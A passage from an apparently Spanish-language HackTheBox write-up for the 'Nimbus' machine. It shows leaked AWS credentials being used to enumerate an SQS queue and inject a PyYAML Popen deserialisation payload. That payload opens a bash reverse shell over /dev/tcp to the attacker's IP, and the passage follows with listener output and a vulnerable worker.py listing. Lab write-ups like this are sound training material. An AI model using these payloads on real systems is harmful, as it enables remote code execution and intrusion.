+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Preview<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"tag"</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"/jobs"</span><span class="p">&gt;</span>← submit another<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"panel err"</span><span class="p">&gt;&lt;</span><span class="nt">strong</span><span class="p">&gt;</span>Error:<span class="p">&lt;/</span><span class="nt">strong</span><span class="p">&gt;</span> YAML parse error.<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>El YAML parse error nos indica que la interfaz web de previsualización cuenta con un filtro o un linter restrictivo que bloquea los tags especiales de Python antes de procesarlos.</p>
+<h3 id="interceptacion-del-flujo-mediante-aws-sqs">Interceptación del Flujo mediante AWS SQS<a class="headerlink" href="#interceptacion-del-flujo-mediante-aws-sqs" title="Permanent link">¶</a></h3>
+<p>Para determinar si los trabajos se procesan por otra vía asíncrona que no pase por el linter de la web, recurrimos a las credenciales comprometidas del rol de AWS. Decidimos auditar los permisos sobre el servicio de mensajería <strong>Amazon SQS (Simple Queue Service)</strong> para comprobar si la infraestructura gestiona las tareas mediante colas de fondo:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>aws<span class="w"> </span>sqs<span class="w"> </span>list-queues<span class="w"> </span>--endpoint-url<span class="w"> </span>http://aws.nimbus.htb
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="p">{</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="w">    </span><span class="nt">"QueueUrls"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="w">        </span><span class="s2">"http://floci:4566/847219365028/nimbus-jobs"</span>
+<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="w">    </span><span class="p">]</span>
+<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="p">}</span>
+</code></pre></div>
+<p>El resultado es clave: el rol web tiene permisos para listar y ver colas en SQS, revelando la existencia de la cola interna nimbus-jobs.</p>
+<p>Esto cambia por completo el escenario: el error de parseo anterior ocurría únicamente en el componente del frontend web, pero el procesamiento real e inseguro de las tareas ocurre cuando el backend consume los mensajes directamente desde esta cola SQS. Al tener acceso legítimo por CLI a la mensajería de AWS, podemos saltarnos el filtro de la web inyectando nuestro YAML malicioso directamente en la cola.</p>
+<h2 id="2-acceso-inicial">2. Acceso Inicial<a class="headerlink" href="#2-acceso-inicial" title="Permanent link">¶</a></h2>
+<h3 id="explotacion-de-la-cola-y-reverse-shell">Explotación de la Cola y Reverse Shell<a class="headerlink" href="#explotacion-de-la-cola-y-reverse-shell" title="Permanent link">¶</a></h3>
+<p>Aprovechando que no hay restricciones de formato al enviar datos crudos a SQS, preparamos un archivo local llamado payload.yaml configurando una Reverse Shell a través de subprocess.Popen:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">rce-job</span>
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="nt">schedule</span><span class="p">:</span><span class="w"> </span><span class="s">"0</span><span class="nv"> </span><span class="s">2</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">*"</span>
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="nt">runtime</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">python3.11</span>
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="nt">action</span><span class="p">:</span><span class="w"> </span><span class="kt">!!python/object/apply:subprocess.Popen</span>
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="w"> </span><span class="s">"bash"</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">"-c"</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">"bash</span><span class="nv"> </span><span class="s">-i</span><span class="nv"> </span><span class="s">&gt;&amp;</span><span class="nv"> </span><span class="s">/dev/tcp/&lt;tu_ip&gt;/4444</span><span class="nv"> </span><span class="s">0&gt;&amp;1"</span><span class="w"> </span><span class="p p-Indicator">]</span>
+</code></pre></div>
+<p>Publicamos el payload directamente en la cola nimbus-jobs usando el comando send-message:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>aws<span class="w"> </span>sqs<span class="w"> </span>send-message<span class="w"> </span>--endpoint-url<span class="w"> </span>http://aws.nimbus.htb<span class="w"> </span>--queue-url<span class="w"> </span>http://floci:4566/847219365028/nimbus-jobs<span class="w"> </span>--message-body<span class="w"> </span><span class="s2">"</span><span class="k">$(</span>cat<span class="w"> </span>payload.yaml<span class="k">)</span><span class="s2">"</span>
+</code></pre></div>
+<p>Dejamos un oyente con netcat en el puerto asignado y, pasados unos segundos, el demonio en segundo plano procesa el mensaje de la cola, deserializa el objeto e inicia la conexión de vuelta:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>Listening<span class="w"> </span>on<span class="w"> </span><span class="m">0</span>.0.0.0<span class="w"> </span><span class="m">4444</span>
+<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>Connection<span class="w"> </span>received<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.129.33.139<span class="w"> </span><span class="m">40218</span>
+<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>bash:<span class="w"> </span>cannot<span class="w"> </span><span class="nb">set</span><span class="w"> </span>terminal<span class="w"> </span>process<span class="w"> </span>group<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="o">)</span>:<span class="w"> </span>Inappropriate<span class="w"> </span>ioctl<span class="w"> </span><span class="k">for</span><span class="w"> </span>device
+<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>bash:<span class="w"> </span>no<span class="w"> </span>job<span class="w"> </span>control<span class="w"> </span><span class="k">in</span><span class="w"> </span>this<span class="w"> </span>shell
+<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>
+<a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>worker@83db7f2f6a7e:/app$<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>~
+<a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>total<span class="w"> </span><span class="m">24</span>
+<a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>drwxr-x---<span class="w"> </span><span class="m">1</span><span class="w"> </span>worker<span class="w"> </span>worker<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">18</span>:10<span class="w"> </span>.
+<a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>drwxr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w">   </span>root<span class="w">   </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">18</span>:05<span class="w"> </span>..
+<a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>-rw-r-----<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w">   </span>worker<span class="w">   </span><span class="m">33</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">18</span>:05<span class="w"> </span>user.txt
+<a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>worker@83db7f2f6a7e:/app$<span class="w"> </span>cat<span class="w"> </span>~/user.txt
+</code></pre></div>
+<h2 id="3-enumeracion-interna-del-contenedor">3. Enumeración interna del contenedor<a class="headerlink" href="#3-enumeracion-interna-del-contenedor" title="Permanent link">¶</a></h2>
+<h3 id="enumeracion-de-ficheros">Enumeración de ficheros<a class="headerlink" href="#enumeracion-de-ficheros" title="Permanent link">¶</a></h3>
+<p>Con una shell activa bajo worker, el primer paso es estabilizarla. Como tenemos Python haremos una simple TTY upgrade:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import pty; pty.spaw("/bin/bash")'</span>
+</code></pre></div>
+<p>Una vez estabilizada la interfaz, iniciamos una inspección de las propiedades del contenedor para ver el entorno donde se ejecutan los trabajos de la cola. Listamos el contenido del directorio actual:
+</p><div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>ls<span class="w"> </span>-la
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>total<span class="w"> </span><span class="m">20</span>
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>drwxr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>worker<span class="w"> </span>root<span class="w">   </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">19</span>:05<span class="w"> </span>.
+<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>drwxr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w">   </span>root<span class="w">   </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">17</span>:23<span class="w"> </span>..
+<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>worker<span class="w"> </span>worker<span class="w"> </span><span class="m">1576</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">19</span>:05<span class="w"> </span>exploit.py
+<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>worker<span class="w"> </span>root<span class="w">     </span><span class="m">28</span><span class="w"> </span>May<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">18</span>:20<span class="w"> </span>requirements.txt
+<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>worker<span class="w"> </span>root<span class="w">   </span><span class="m">1826</span><span class="w"> </span>May<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">18</span>:20<span class="w"> </span>worker.py
+</code></pre></div><p></p>
+<h3 id="funcionamiento-de-workerpy">Funcionamiento de worker.py<a class="headerlink" href="#funcionamiento-de-workerpy" title="Permanent link">¶</a></h3>
+<p>Analizamos el código fuente de 'worker.py' para corroborar el comportamiento de la infraestructura interna y entender que librerias maneja:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>cat<span class="w"> </span>worker.py<span class="w"> </span>
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="s2">"""Nimbus job worker. Polls SQS, parses messages with yaml.load (vulnerable)."""</span>
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>import<span class="w"> </span>os,<span class="w"> </span>time,<span class="w"> </span>subprocess,<span class="w"> </span>boto3,<span class="w"> </span>yaml
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>
+<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="nv">ENDPOINT</span><span class="w">  </span><span class="o">=</span><span class="w"> </span>os.environ.get<span class="o">(</span><span class="s2">"AWS_ENDPOINT_URL"</span>,<span class="w"> </span><span class="s2">"http://aws.nimbus.htb"</span><span class="o">)</span>
+<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="nv">QUEUE_URL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>os.environ.get<span class="o">(</span><span class="s2">"QUEUE_URL"</span>,<span class="w"> </span><span class="s2">"http://aws.nimbus.htb/000000000000/nimbus-jobs"</span><span class="o">)</span>
+<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a><span class="nv">REGION</span><span class="w">    </span><span class="o">=</span><span class="w"> </span>os.environ.get<span class="o">(</span><span class="s2">"AWS_DEFAULT_REGION"</span>,<span class="w"> </span><span class="s2">"us-east-1"</span><span class="o">)</span>
+<a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a><span class="nv">POLL_SECS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">5</span>
+<a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a>
+<a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a>print<span class="o">(</span>f<span class="s2">"[worker] starting; endpoint={ENDPOINT} queue={QUEUE_URL}"</span>,<span class="w"> </span><span class="nv">flush</span><span class="o">=</span>True<span class="o">)</span>
+<a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a><span class="nv">sqs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>boto3.client<span class="o">(</span><span class="s2">"sqs"</span>,<span class="w"> </span><span class="nv">endpoint_url</span><span class="o">=</span>ENDPOINT,<span class="w"> </span><span class="nv">region_name</span><span class="o">=</span>REGION<span class="o">)</span>
+<a id="__codelineno-27-12" name="__codelineno-27-12" href="#__codelineno-27-12"></a>
+<a id="__codelineno-27-13" name="__codelineno-27-13" href="#__codelineno-27-13"></a>def<span class="w"> </span>handle_message<span class="o">(</span>body<span class="o">)</span>:
+<a id="__codelineno-27-14" name="__codelineno-27-14" href="#__codelineno-27-14"></a><span class="w">    </span>print<span class="o">(</span>f<span class="s2">"[worker] received message ({len(body)} bytes)"</span>,<span class="w"> </span><span class="nv">flush</span><span class="o">=</span>True<span class="o">)</span>
+<a id="__codelineno-27-15" name="__codelineno-27-15" href="#__codelineno-27-15"></a><span class="w">    </span><span class="nv">job</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>yaml.load<span class="o">(</span>body,<span class="w"> </span><span class="nv">Loader</span><span class="o">=</span>yaml.Loader<span class="o">)</span><span class="w">  </span><span class="c1"># vulnerable</span>
+<a id="__codelineno-27-16" name="__codelineno-27-16" href="#__codelineno-27-16"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span>not<span class="w"> </span>isinstance<span class="o">(</span>job,<span class="w"> </span>dict<span class="o">)</span>:
+<a id="__codelineno-27-17" name="__codelineno-27-17" href="#__codelineno-27-17"></a><span class="w">        </span>print<span class="o">(</span><span class="s2">"[worker] message did not parse to a dict, skipping"</span>,<span class="w"> </span><span class="nv">flush</span><span class="o">=</span>True<span class="o">)</span>
+<a id="__codelineno-27-18" name="__codelineno-27-18" href="#__codelineno-27-18"></a><span class="w">        </span><span class="k">return</span>
+<a id="__codelineno-27-19" name="__codelineno-27-19" href="#__codelineno-27-19"></a><span class="w">    </span><span class="nv">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>job.get<span class="o">(</span><span class="s2">"name"</span>,<span class="w"> </span><span class="s2">"&lt;unnamed&gt;"</span><span class="o">)</span>
+<a id="__codelineno-27-20" name="__codelineno-27-20" href="#__codelineno-27-20"></a><span class="w">    </span><span class="nv">script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>job.get<span class="o">(</span><span class="s2">"script"</span>,<span class="w"> </span><span class="s2">""</span><span class="o">)</span>
+<a id="__codelineno-27-21" name="__codelineno-27-21" href="#__codelineno-27-21"></a><span class="w">    </span>print<span class="o">(</span>f<span class="s2">"[worker] running job '{name}'"</span>,<span class="w"> </span><span class="nv">flush</span><span class="o">=</span>True<span class="o">)</span>
+<a id="__codelineno-27-22" name="__codelineno-27-22" href="#__codelineno-27-22"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span>script:
+<a id="__codelineno-27-23" name="__codelineno-27-23" href="#__codelineno-27-23"></a><span class="w">        </span><span class="nv">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>subprocess.run<span class="o">([</span><span class="s2">"python3"</span>,<span class="w"> </span><span class="s2">"-c"</span>,<span class="w"> </span>script<span class="o">]</span>,
+<a id="__codelineno-27-24" name="__codelineno-27-24" href="#__codelineno-27-24"></a><span class="w">            </span><span class="nv">capture_output</span><span class="o">=</span>True,<span class="w"> </span><span class="nv">text</span><span class="o">=</span>True,<span class="w"> </span><span class="nv">timeout</span><span class="o">=</span><span class="m">30</span><span class="o">)</span>
+<a id="__codelineno-27-25" name="__codelineno-27-25" href="#__codelineno-27-25"></a><span class="w">        </span>print<span class="o">(</span>f<span class="s2">"[worker] stdout: {result.stdout}"</span>,<span class="w"> </span><span class="nv">flush</span><span class="o">=</span>True<span class="o">)</span>
+<a id="__codelineno-27-26" name="__codelineno-27-26" href="#__codelineno-27-26"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span>result.stderr:<span class="w"> </span>print<span class="o">(</span>f<span class="s2">"[worker] stderr: {result.stderr}"</span>,<span class="w"> </span><span class="nv">flush</span><span class="o">=</span>True<span class="o">)</span>
+<a id="__codelineno-27-27" name="__codelineno-27-27" href="#__codelineno-27-27"></a>
+<a id="__codelineno-27-28" name="__codelineno-27-28" href="#__codelineno-27-28"></a>def<span class="w"> </span>main<span class="o">()</span>:
+<a id="__codelineno-27-29" name="__codelineno-27-29" href="#__codelineno-27-29"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span>True:
+<a id="__codelineno-27-30" name="__codelineno-27-30" href="#__codelineno-27-30"></a><span class="w">        </span>try:
+<a id="__codelineno-27-31" name="__codelineno-27-31" href="#__codelineno-27-31"></a><span class="w">            </span><span class="nv">resp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>sqs.receive_message<span class="o">(</span><span class="nv">QueueUrl</span><span class="o">=</span>QUEUE_URL,
+<a id="__codelineno-27-32" name="__codelineno-27-32" href="#__codelineno-27-32"></a><span class="w">                </span><span class="nv">MaxNumberOfMessages</span><span class="o">=</span><span class="m">1</span>,<span class="w"> </span><span class="nv">WaitTimeSeconds</span><span class="o">=</span>POLL_SECS<span class="o">)</span>
+<a id="__codelineno-27-33" name="__codelineno-27-33" href="#__codelineno-27-33"></a><span class="w">            </span><span class="k">for</span><span class="w"> </span>m<span class="w"> </span><span class="k">in</span><span class="w"> </span>resp.get<span class="o">(</span><span class="s2">"Messages"</span>,<span class="w"> </span><span class="o">[])</span>:
+<a id="__codelineno-27-34" name="__codelineno-27-34" href="#__codelineno-27-34"></a><span class="w">                </span>try:<span class="w"> </span>handle_message<span class="o">(</span>m<span class="o">[</span><span class="s2">"Body"</span><span class="o">])</span>
+<a id="__codelineno-27-35" name="__codelineno-27-35" href="#__codelineno-27-35"></a><span class="w">                </span>except<span class="w"> </span>Exception<span class="w"> </span>as<span class="w"> </span>e:<span class="w"> </span>print<span class="o">(</span>f<span class="s2">"[worker] error: {e}"</span>,<span class="w"> </span><span class="nv">flush</span><span class="o">=</span>True<span class="o">)</span>
+<a id="__codelineno-27-36" name="__codelineno-27-36" href="#__codelineno-27-36"></a><span class="w">                </span>finally:
+<a id="__codelineno-27-37" name="__codelineno-27-37" href="#__codelineno-27-37"></a><span class="w">                    </span>sqs.delete_message<span class="o">(</span><span class="nv">QueueUrl</span><span class="o">=</span>QUEUE_URL,<span class="w"> </span><span class="nv">ReceiptHandle</span><span class="o">=</span>m<span class="o">[</span><span class="s2">"ReceiptHandle"</span><span class="o">])</span>
+<a id="__codelineno-27-38" name="__codelineno-27-38" href="#__codelineno-27-38"></a><span class="w">        </span>except<span class="w"> </span>Exception<span class="w"> </span>as<span class="w"> </span>e:
+<a id="__codelineno-27-39" name="__codelineno-27-39" href="#__codelineno-27-39"></a><span class="w">            </span>print<span class="o">(</span>f<span class="s2">"[worker] poll error: {e}"</span>,<span class="w"> </span><span class="nv">flush</span><span class="o">=</span>True<span class="o">)</span>
+<a id="__codelineno-27-40" name="__codelineno-27-40" href="#__codelineno-27-40"></a><span class="w">            </span>time.sleep<span class="o">(</span>POLL_SECS<span class="o">)</span>
+<a id="__codelineno-27-41" name="__codelineno-27-41" href="#__codelineno-27-41"></a>
+<a id="__codelineno-27-42" name="__codelineno-27-42" href="#__codelineno-27-42"></a><span class="k">if</span><span class="w"> </span><span class="nv">__name__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">"__main__"</span>:
+<a id="__codelineno-27-43" name="__codelineno-27-43" href="#__codelineno-27-43"></a><span class="w">    </span>main<span class="o">()</span>
+<a id="__codelineno-27-44" name="__codelineno-27-44" href="#__codelineno-27-44"></a>worker@83db7f2f6a7e:/app$<span class="w"> </span>python3<span class="w"> </span>exploit.py
+<a id="__codelineno-27-45" name="__codelineno-27-45" href="#__codelineno-27-45"></a>python3<span class="w"> </span>exploit.py
+<a id="__codelineno-27-46" name="__codelineno-27-46" href="#__codelineno-27-46"></a>started:<span class="w"> </span>nimbus-exploit:1
+<a id="__codelineno-27-47" name="__codelineno-27-47" href="#__codelineno-27-47"></a>worker@83db7f2f6a7e:/app$<span class="w"> </span>cat<span class="w"> </span>worker<span class="w">    </span>
+<a id="__codelineno-27-48" name="__codelineno-27-48" href="#__codelineno-27-48"></a>cat<span class="w"> </span>worker.py<span class="w"> </span>
+<a id="__codelineno-27-49" name="__codelineno-27-49" href="#__codelineno-27-49"></a><span class="s2">"""Nimbus job worker. Polls SQS, parses messages with yaml.load (vulnerable)."""</span>
+<a id="__codelineno-27-50" name="__codelineno-27-50" href="#__codelineno-27-50"></a>import<span class="w"> </span>os,<span class="w"> </span>time,<span class="w"> </span>subprocess,<span class="w"> </span>boto3,<span class="w"> </span>yaml
+<a id="__codelineno-27-51" name="__codelineno-27-51" href="#__codelineno-27-51"></a>
+<a id="__codelineno-27-52" name="__codelineno-27-52" href="#__codelineno-27-52"></a><span class="nv">ENDPOINT</span><span class="w">  </span><span class="o">=</span><span class="w"> </span>os.environ.get<span class="o">(</span><span class="s2">"AWS_ENDPOINT_URL"</span>,<span class="w"> </span><span class="s2">"http://aws.nimbus.htb"</span><span class="o">)</span>
+<a id="__codelineno-27-53" name="__codelineno-27-53" href="#__codelineno-27-53"></a><span class="nv">QUEUE_URL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>os.environ.get<span class="o">(</span><span class="s2">"QUEUE_URL"</span>,<span class="w"> </span><span class="s2">"http://aws.nimbus.htb/000000000000/nimbus-jobs"</span><span class="o">)</span>
+<a id="__codelineno-27-54" name="__codelineno-27-54" href="#__codelineno-27-54"></a><span class="nv">REGION</span><span class="w">    </span><span class="o">=</span><span class="w"> </span>os.environ.get<span class="o">(</span><span class="s2">"AWS_DEFAULT_REGION"</span>,<span class="w"> </span><span class="s2">"us-east-1"</span><span class="o">)</span>
+<a id="__codelineno-27-55" name="__codelineno-27-55" href="#__codelineno-27-55"></a><span class="nv">POLL_SECS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">5</span>
+<a id="__codelineno-27-56" name="__codelineno-27-56" href="#__codelineno-27-56"></a>
+<a id="__codelineno-27-57" name="__codelineno-27-57" href="#__codelineno-27-57"></a>print<span class="o">(</span>f<span class="s2">"[worker] starting; endpoint={ENDPOINT} queue={QUEUE_URL}"</span>,<span class="w"> </span><span class="nv">flush</span><span class="o">=</span>True<span class="o">)</span>
+<a id="__codelineno-27-58" name="__codelineno-27-58" href="#__codelineno-27-58"></a><span class="nv">sqs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>boto3.client<span class="o">(</span><span class="s2">"sqs"</span>,<span class="w"> </span><span class="nv">endpoint_url</span><span class="o">=</span>ENDPOINT,<span class="w"> </span><span class="nv">region_name</span><span class="o">=</span>REGION<span class="o">)</span>
+<a id="__codelineno-27-59" name="__codelineno-27-59" href="#__codelineno-27-59"></a>
+<a id="__codelineno-27-60" name="__codelineno-27-60" href="#__codelineno-27-60"></a>def<span class="w"> </span>handle_message<span class="o">(</span>body<span class="o">)</span>:
+<a id="__codelineno-27-61" name="__codelineno-27-61" href="#__codelineno-27-61"></a><span class="w">    </span>print<span class="o">(</span>f<span class="s2">"[worker] received message ({len(body)} bytes)"</span>,<span class="w"> </span><span class="nv">flush</span><span class="o">=</span>True<span class="o">)</span>
+<a id="__codelineno-27-62" name="__codelineno-27-62" href="#__codelineno-27-62"></a><span class="w">    </span><span class="nv">job</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>yaml.load<span class="o">(</span>body,<span class="w"> </span><span class="nv">Loader</span><span class="o">=</span>yaml.Loader<span class="o">)</span><span class="w">  </span><span class="c1"># vulnerable</span>
+<a id="__codelineno-27-63" name="__codelineno-27-63" href="#__codelineno-27-63"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span>not<span class="w"> </span>isinstance<span class="o">(</span>job,<span class="w"> </span>dict<span class="o">)</span>:
+<a id="__codelineno-27-64" name="__codelineno-27-64" href="#__codelineno-27-64"></a><span class="w">        </span>print<span class="o">(</span><span class="s2">"[worker] message did not parse to a dict, skipping"</span>,<span class="w"> </span><span class="nv">flush</span><span class="o">=</span>True<span class="o">)</span>
+<a id="__codelineno-27-65" name="__codelineno-27-65" href="#__codelineno-27-65"></a><span class="w">        </span><span class="k">return</span>
+<a id="__codelineno-27-66" name="__codelineno-27-66" href="#__codelineno-27-66"></a><span class="w">    </span><span class="nv">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>job.get<span class="o">(</span><span class="s2">"name"</span>,<span class="w"> </span><span class="s2">"&lt;unnamed&gt;"</span><span class="o">)</span>
+<a id="__codelineno-27-67" name="__codelineno-27-67" href="#__codelineno-27-67"></a><span class="w">    </span><span class="nv">script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>job.get<span class="o">(</span><span class="s2">"script"</span>,<span class="w"> </span><span class="s2">""</span><span class="o">)</span>
+<a id="__codelineno-27-68" name="__codelineno-27-68" href="#__codelineno-27-68"></a><span class="w">    </span>print<span class="o">(</span>f<span class="s2">"[worker] running job '{name}'"</span>,<span class="w"> </span><span class="nv">flush</span><span class="o">=</span>True<span class="o">)</span>
+<a id="__codelineno-27-69" name="__codelineno-27-69" href="#__codelineno-27-69"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span>script:
+<a id="__codelineno-27-70" name="__codelineno-27-70" href="#__codelineno-27-70"></a><span class="w">        </span><span class="nv">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>subprocess.run<span class="o">([</span><span class="s2">"python3"</span>,<span class="w"> </span><span class="s2">"-c"</span>,<span class="w"> </span>script<span class="o">]</span>,
+<a id="__codelineno-27-71" name="__codelineno-27-71" href="#__codelineno-27-71"></a><span class="w">            </span><span class="nv">capture_output</span><span class="o">=</span>True,<span class="w"> </span><span class="nv">text</span><span class="o">=</span>True,<span class="w"> </span><span class="nv">timeout</span><span class="o">=</span><span class="m">30</span><span class="o">)</span>
+<a id="__codelineno-27-72" name="__codelineno-27-72" href="#__codelineno-27-72"></a><span class="w">        </span>print<span class="o">(</span>f<span class="s2">"[worker] stdout: {result.stdout}"</span>,<span class="w"> </span><span class="nv">flush</span><span class="o">=</span>True<span class="o">)</span>
+<a id="__codelineno-27-73" name="__codelineno-27-73" href="#__codelineno-27-73"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span>result.stderr:<span class="w"> </span>print<span class="o">(</span>f<span class="s2">"[worker] stderr: {result.stderr}"</span>,<span class="w"> </span><span class="nv">flush</span><span class="o">=</span>True<span class="o">)</span>
+<a id="__codelineno-27-74" name="__codelineno-27-74" href="#__codelineno-27-74"></a>
+<a id="__codelineno-27-75" name="__codelineno-27-75" href="#__codelineno-27-75"></a>def<span class="w"> </span>main<span class="o">()</span>:
+<a id="__codelineno-27-76" name="__codelineno-27-76" href="#__codelineno-27-76"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span>True:
+<a id="__codelineno-27-77" name="__codelineno-27-77" href="#__codelineno-27-77"></a><span class="w">        </span>try:
+<a id="__codelineno-27-78" name="__codelineno-27-78" href="#__codelineno-27-78"></a><span class="w">            </span><span class="nv">resp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>sqs.receive_message<span class="o">(</span><span class="nv">QueueUrl</span><span class="o">=</span>QUEUE_URL,
